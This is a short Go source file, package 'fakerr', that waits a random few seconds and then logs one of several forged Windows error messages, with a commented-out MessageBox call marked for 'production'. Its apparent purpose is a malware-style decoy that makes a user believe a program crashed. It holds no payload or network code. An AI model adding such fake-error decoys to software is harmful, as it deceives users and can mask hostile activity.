// ============================================================
// fakerr.go - Fake Error Display
// ============================================================
package fakerr

import (
	"log"
	"math/rand"
	"time"
)

// Show displays a fake error message
func Show() {
	// Wait random time before showing
	rand.Seed(time.Now().UnixNano())
	delay := time.Duration(rand.Intn(10)+5) * time.Second
	
	log.Printf("⏳ Fake error will appear in %.0f seconds", delay.Seconds())
	time.Sleep(delay)
	
	// Show fake error
	showFakeError()
}

// showFakeError displays the fake error message
func showFakeError() {
	errors := []string{
		"Application failed to start because MSVCRT.dll was not found.",
		"Windows could not access the specified device, path, or file.",
		"The application was unable to start correctly (0xc0000005).",
		"Error loading system libraries. Please reinstall the application.",
		"Microsoft Visual C++ Runtime Library: Runtime Error!",
	}
	
	// In production, use Windows MessageBox API
	msg := errors[rand.Intn(len(errors))]
	log.Printf("📢 Fake error: %s", msg)
	
	// For Windows, display message box
	// Messagebox(0, msg, "Application Error", 0x10)
}